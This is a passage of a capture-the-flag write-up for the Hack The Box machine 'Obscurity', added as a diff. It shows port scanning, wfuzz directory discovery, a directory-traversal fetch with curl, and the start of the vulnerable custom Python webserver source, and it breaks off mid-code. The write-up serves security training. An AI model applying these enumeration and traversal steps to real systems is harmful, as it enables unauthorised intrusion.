@@ -1,0 +1,1291 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Obscurity</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-obscurity">htb-obscurity</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#dirsearch">dirsearch</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#python-injection">python-injection</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#code-analysis">code-analysis</a> <a class="post-tag" href="/tags#crypto">crypto</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#race-condition">race-condition</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#lxd">lxd</a> <a class="post-tag" href="/tags#lxc">lxc</a> <a class="post-tag" href="/tags#arbitrary-write">arbitrary-write</a> <a class="post-tag" href="/tags#python-path">python-path</a> <a class="post-tag" href="/tags#htb-mischief">htb-mischief</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-05-09T14:45:00+00:00" itemprop="datePublished">May 9, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/05/09/htb-obscurity.html" style="color: #e6e6e6; text-decoration: none;">HTB: Obscurity</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/obscurity-cover.webp" type="image/webp"/>
+<img alt="Obscurity" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/obscurity-cover.jpg" style="float: right;margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Obscuirt was a medium box that centered on finding bugs in Python implementations of things - a webserver, an encryption scheme, and an SSH client. I’ll start by locating the source for the custom Python webserver, and injecting into it to get code execution and a shell. I’ll pivot to the next user abusing a poor custom cipher to decrypt a password. To get root, I’ll show four different ways. Two involve an SSH-like script that I can abuse both via a race condition to leak the system hashes and via injection to run a command as root instead of the authed user. The other two were patches after the box was released, but I’ll show them, exploiting the Python path, and exploiting the lxd group.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/219 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/obscurity" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Obscurity</a> <a href="https://hackthebox.com/machines/obscurity" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-obscurity.webp" type="image/webp"/> <img alt="Obscurity" class="img-av" src="/icons/box-obscurity.png"/></picture></a><br/><a href="https://hackthebox.com/machines/obscurity" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1199992939390353409">30 Nov 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">09 May 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/obscurity-diff.webp" type="image/webp"/><img alt="Rated difficulty for Obscurity" src="/img/obscurity-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/obscurity-radar.webp" type="image/webp"/><img alt="Radar chart for Obscurity" src="/img/obscurity-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:24:12</span><a href="https://app.hackthebox.com/users/836" rel="noopener" target="_blank"><img alt="sampriti" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/836" style="display: unset"/><span class="user-text" style="display: none"> sampriti</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:36:36</span><a href="https://app.hackthebox.com/users/836" rel="noopener" target="_blank"><img alt="sampriti" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/836" style="display: unset"/><span class="user-text" style="display: none"> sampriti</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/83743" rel="noopener" target="_blank"><img alt="clubby789" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/83743" style="display: unset"/><span class="user-text" style="display: none"> clubby789</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows two ports open, SSH (22) and HTTP (8080):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000  10.10.10.168
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-30 14:05 EST
+Nmap scan report for 10.10.10.168
+Host is up (0.035s latency).
+Not shown: 65531 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   closed http
+8080/tcp open   http-proxy
+9000/tcp closed cslistener
+
+Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,8080,9000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.168
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-30 14:05 EST
+Nmap scan report for 10.10.10.168
+Host is up (0.025s latency).
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings:
+|   GetRequest, HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Sat, 30 Nov 2019 19:06:18
+|     Server: BadHTTPServer
+|     Last-Modified: Sat, 30 Nov 2019 19:06:18
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;0bscura&lt;/title&gt;
+|     &lt;meta http-equiv="X-UA-Compatible" content="IE=Edge"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;meta name="keywords" content=""&gt;
+|     &lt;meta name="description" content=""&gt;
+|     &lt;!--
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     &lt;!-- stylesheet css --&gt;
+|     &lt;link rel="stylesheet" href="css/bootstrap.min.css"&gt;
+|     &lt;link rel="stylesheet" href="css/font-awesome.min.css"&gt;
+|     &lt;link rel="stylesheet" href="css/templatemo-blue.css"&gt;
+|     &lt;/head&gt;
+|     &lt;body data-spy="scroll" data-target=".navbar-collapse"&gt;
+|     &lt;!-- preloader section --&gt;
+|     &lt;!--
+|     &lt;div class="preloader"&gt;
+|_    &lt;div class="sk-spinner sk-spinner-wordpress"&gt;
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.70%I=7%D=11/30%Time=5DE2BD9D%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2030\x20Nov\x202
+SF:019\x2019:06:18\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2030
+SF:\x20Nov\x202019\x2019:06:18\nContent-Length:\x204171\nContent-Type:\x20
+SF:text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\
+SF:"en\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;
+SF:\n\t&lt;meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\"&gt;\n\t
+SF:&lt;meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
+SF:scale=1\"&gt;\n\t&lt;meta\x20name=\"keywords\"\x20content=\"\"&gt;\n\t&lt;meta\x20n
+SF:ame=\"description\"\x20content=\"\"&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Temp
+SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20s
+SF:tylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\"stylesheet\"\x20href=\"css/bo
+SF:otstrap\.min\.css\"&gt;\n\t&lt;link\x20rel=\"stylesheet\"\x20href=\"css/font-
+SF:awesome\.min\.css\"&gt;\n\t&lt;link\x20rel=\"stylesheet\"\x20href=\"css/templ
+SF:atemo-blue\.css\"&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\"scroll\"\x20data-targe
+SF:t=\"\.navbar-collapse\"&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n
+SF:&lt;div\x20class=\"preloader\"&gt;\n\t&lt;div\x20class=\"sk-spinner\x20sk-spinne
+SF:r-wordpress\"&gt;\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x2
+SF:0Sat,\x2030\x20Nov\x202019\x2019:06:18\nServer:\x20BadHTTPServer\nLast-
+SF:Modified:\x20Sat,\x2030\x20Nov\x202019\x2019:06:18\nContent-Length:\x20
+SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x2
+SF:0html&gt;\n&lt;html\x20lang=\"en\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\
+SF:t&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\"X-UA-Compatible\"\x20c
+SF:ontent=\"IE=Edge\"&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=\"width=de
+SF:vice-width,\x20initial-scale=1\"&gt;\n\t&lt;meta\x20name=\"keywords\"\x20cont
+SF:ent=\"\"&gt;\n\t&lt;meta\x20name=\"description\"\x20content=\"\"&gt;\n&lt;!--\x20\n
+SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
+SF:ofile\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\"styles
+SF:heet\"\x20href=\"css/bootstrap\.min\.css\"&gt;\n\t&lt;link\x20rel=\"styleshee
+SF:t\"\x20href=\"css/font-awesome\.min\.css\"&gt;\n\t&lt;link\x20rel=\"styleshee
+SF:t\"\x20href=\"css/templatemo-blue\.css\"&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\
+SF:"scroll\"\x20data-target=\"\.navbar-collapse\"&gt;\n\n&lt;!--\x20preloader\x2
+SF:0section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\"preloader\"&gt;\n\t&lt;div\x20class=\"
+SF:sk-spinner\x20sk-spinner-wordpress\"&gt;\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds
+</span></code></pre></div></div>
+<p>It’s also showing TCP 80 and 9000 as closed, which means they are sending reset packets instead of just no reply like the other ports. It’ll be interesting to see if I can get them to talk from some other perspective.</p>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH version</a>, this looks like Ubuntu Bionic (18.04). The HTTP server looks non-standard. I’ll dig on that.</p>
+<h3 id="website---tcp-8080">Website - TCP 8080</h3>
+<h4 id="site">Site</h4>
+<p>The page doesn’t say much about what the page is for, other than to give information on the webserver:</p>
+<div style="max-height: 600px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20191130153239351.png">
+<img alt="Web page" src="https://0xdfimages.gitlab.io/img/image-20191130153239351.png" style="clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 575px"><a href="https://0xdfimages.gitlab.io/img/image-20191130153239351.png"><i>Click for full image</i></a></div>
+</div>
+<p>The text talks about how the site uses custom servers.</p>
+<p>There’s also the note to the devs:</p>
+<blockquote>
+<p>The current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory.</p>
+</blockquote>
+<p>I took a quick look at the page source, but there wasn’t much interesting. The only paths were <code class="language-plaintext highlighter-rouge">/css</code> and <code class="language-plaintext highlighter-rouge">/js</code>, and nothing there jumped out as unusual.</p>
+<h4 id="server-enumeration">Server Enumeration</h4>
+<p>Poking at the webserver confirms it is a custom server. There’s a response header for <code class="language-plaintext highlighter-rouge">BadHTTPServer</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 01 Dec 2019 13:26:59</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">BadHTTPServer</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Sun, 01 Dec 2019 13:26:59</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4171</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Closed</span>
+</code></pre></div></div>
+<p>Additionally, things break when I try to run <code class="language-plaintext highlighter-rouge">gobuster</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.168:8080 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+<span class="go">===============================================================                                     
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                     
+===============================================================                                     
+[+] Url:            http://10.10.10.168:8080
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                     
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================                                     
+2019/12/02 16:09:49 Starting gobuster
+===============================================================                                     
+2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=&lt;nil&gt;
+2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=&lt;nil&gt;
+2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=&lt;nil&gt;
+2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=&lt;nil&gt;
+...[snip]...
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">dirsearch.py</code> works fine, but it doesn’t find anything other than <code class="language-plaintext highlighter-rouge">/</code>, which is weird, because I already noted the <code class="language-plaintext highlighter-rouge">css</code> and <code class="language-plaintext highlighter-rouge">js</code> directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>dirsearch.py <span class="nt">-u</span> http://10.10.10.168:8080 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+<span class="go">
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions:  | Threads: 10 | Wordlist size: 87646
+
+Error Log: /opt/dirsearch/logs/errors-19-12-02_16-13-04.log
+
+Target: http://10.10.10.168:8080
+
+[16:13:04] Starting: 
+[16:13:04] 200 -    4KB - /
+
+Task Completed
+</span></code></pre></div></div>
+<p>I can see this clearly with <code class="language-plaintext highlighter-rouge">curl</code>. Even though the dir exists, going to it directly returns a 404. Typically this would be a 403 Forbidden, or a dir list:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-I</span> 10.10.10.168:8080/js
+<span class="go">HTTP/1.1 404 NOT FOUND
+Date: Sat, 30 Nov 2019 20:40:51
+Server: BadHTTPServer
+Last-Modified: Sat, 30 Nov 2019 20:40:51
+Content-Length: 150
+Content-Type: text/html
+Connection: Closed
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-I</span> 10.10.10.168:8080/js/custom.js
+<span class="go">HTTP/1.1 200 OK
+Date: Sat, 30 Nov 2019 20:42:57
+Server: BadHTTPServer
+Last-Modified: Sat, 30 Nov 2019 20:42:57
+Content-Length: 414
+Content-Type: application/javascript
+Connection: Closed
+</span></code></pre></div></div>
+<h4 id="find-source">Find Source</h4>
+<p>Given I know the name of the file I’m looking for, that it’s in a “secret development directory”, and I can’t count on standard tools to identify the directory name, I’ll use <code class="language-plaintext highlighter-rouge">wfuzz</code>, targeting  the url <code class="language-plaintext highlighter-rouge">http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code>. Every time I run this, it dies around 2000 tests:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt <span class="nt">-u</span> http://10.10.10.168:8080/FUZZ/SuperSecureServer.py <span class="nt">--hl</span> 6 <span class="nt">--hw</span> 367
+<span class="go">
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+Total requests: 87664
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                                  
+===================================================================
+
+000002045:   404        6 L      14 W     172 Ch      "297"
+Fatal exception: Pycurl error 52: Empty reply from server
+</span></code></pre></div></div>
+<p>It seems there’s some kind of weird response from the server that’s breaking things. Since the page said it was in the development directory, I did a grep on <code class="language-plaintext highlighter-rouge">dev</code> to make a smaller wordlist 125 lines long:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">grep </span>dev /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="o">&gt;</span> dev_dirs
+<span class="gp">root@kali#</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-l</span> dev_dirs
+<span class="go">125 dev_dirs
+</span></code></pre></div></div>
+<p>Rerunning <code class="language-plaintext highlighter-rouge">wfuzz</code> with this list finds something:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> dev_dirs <span class="nt">-u</span> http://10.10.10.168:8080/FUZZ/SuperSecureServer.py <span class="nt">--hl</span> 6 <span class="nt">--hw</span> 367
+<span class="go">
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+Total requests: 125
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                                  
+===================================================================
+
+000000009:   200        170 L    498 W    5892 Ch     "develop"                                                                                                                                                
+
+Total time: 0.451881
+Processed Requests: 125
+Filtered Requests: 124
+Requests/sec.: 276.6211
+</span></code></pre></div></div>
+<h4 id="server-source">Server Source</h4>
+<p>Having found the directory, I can get the server source from that url, <code class="language-plaintext highlighter-rouge">http://10.10.10.168:8080/develop/SuperSecureServer.py</code>.</p>
+<p>It turns out that because the server doesn’t handle directory traversal safely, I could also get it from <code class="language-plaintext highlighter-rouge">http://10.10.10.168:8080/../SuperSecureServer.py</code>. I can use <code class="language-plaintext highlighter-rouge">curl</code> with the <code class="language-plaintext highlighter-rouge">--path-as-is</code> flag to allow for <code class="language-plaintext highlighter-rouge">../</code>. I’m not sure how I would have found that without a shell to see that there are two copies of <code class="language-plaintext highlighter-rouge">SuperSecureServer.py</code>, or just a wild guess that it might exist in <code class="language-plaintext highlighter-rouge">../</code>.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="code-analysis">Code Analysis</h3>
+<p>Now I have the full server code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">mimetypes</span>
+<span class="kn">import</span> <span class="n">urllib.parse</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+
+<span class="n">respTemplate</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">HTTP/1.1 {statusNum} {statusCode}
+Date: {dateSent}
+Server: {server}
+Last-Modified: {modified}
+Content-Length: {length}
+Content-Type: {contentType}
+Connection: {connectionType}
+
+{body}
+</span><span class="sh">"""</span>
+<span class="n">DOC_ROOT</span> <span class="o">=</span> <span class="sh">"</span><span class="s">DocRoot</span><span class="sh">"</span>
+
+<span class="n">CODES</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">200</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="sh">"</span><span class="s">304</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">NOT MODIFIED</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">400</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">BAD REQUEST</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">401</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">UNAUTHORIZED</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">403</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">FORBIDDEN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">404</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">NOT FOUND</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="sh">"</span><span class="s">500</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">INTERNAL SERVER ERROR</span><span class="sh">"</span><span class="p">}</span>
+
+<span class="n">MIMES</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">txt</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">css</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">text/css</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">html</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">png</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">image/png</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">jpg</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">image/jpg</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="sh">"</span><span class="s">ttf</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">otf</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">woff</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">font/woff</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">woff2</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">font/woff2</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="sh">"</span><span class="s">js</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/javascript</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">gz</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/zip</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">py</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">map</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/octet-stream</span><span class="sh">"</span><span class="p">}</span>
+
+
+<span class="k">class</span> <span class="nc">Response</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
+        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">dateSent</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">modified</span> <span class="o">=</span> <span class="n">now</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">"</span><span class="s">%a, %d %b %Y %H:%M:%S</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">stringResponse</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">respTemplate</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="n">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">Request</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">method</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">doc</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">vers</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">header</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">]</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>        
